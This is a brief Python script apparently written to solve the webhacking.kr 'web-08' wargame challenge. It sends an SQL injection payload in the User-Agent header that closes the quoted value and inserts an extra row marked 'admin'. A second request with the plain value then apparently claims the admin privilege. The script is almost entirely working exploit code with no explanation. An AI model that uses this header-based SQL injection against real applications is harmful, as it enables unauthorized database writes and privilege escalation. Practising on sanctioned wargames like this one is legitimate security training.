import urllib.request, urllib.error, urllib.parse
  
url = "http://webhacking.kr/challenge/web/web-08/"
session = "PHPSESSID_VALUE"
header = "TEST1234', '1234', 'admin'), ('gtobio11"
req=urllib.request.Request(url)
req.add_header('User-Agent', header)
req.add_header('Cookie','PHPSESSID=%s' % session)
rsp=urllib.request.urlopen(req).read()
print(rsp)

header = "TEST1234"
req.add_header('User-Agent', header)
req.add_header('Cookie','PHPSESSID=%s' % session)
rsp=urllib.request.urlopen(req).read()
print(rsp)
